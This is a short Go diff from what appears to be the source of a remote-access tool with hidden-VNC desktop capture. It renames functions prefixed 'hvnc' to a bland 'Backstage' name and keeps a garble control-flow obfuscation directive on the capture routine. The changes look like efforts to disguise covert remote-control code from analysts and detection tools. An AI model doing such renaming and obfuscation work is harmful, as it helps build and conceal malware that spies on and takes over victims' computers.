@@ -508,7 +508,7 @@ func ensureHVNCThread() error {
 				case hvncTaskAutoStartExplorer:
 					result.err = hvncAutoStartExplorerOnThread()
 				default:
-					result.img, result.err = hvncCaptureDisplayOnThread(task.display)
+					result.img, result.err = BackstageCaptureDisplayOnThread(task.display)
 				}
 
 				dur := time.Since(start)
@@ -535,7 +535,7 @@ func ensureHVNCThread() error {
 	return hvncThreadErr
 }
 
-func hvncCaptureDisplay(display int) (*image.RGBA, error) {
+func BackstageCaptureDisplay(display int) (*image.RGBA, error) {
 	if err := ensureHVNCThread(); err != nil {
 		return nil, err
 	}
@@ -846,7 +846,7 @@ func hvncEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
 	return hvncCapHDCScreen, hvncCapHDCMem, buf, true
 }
 
-func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
+func BackstageCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	captureMu.Lock()
 	defer captureMu.Unlock()
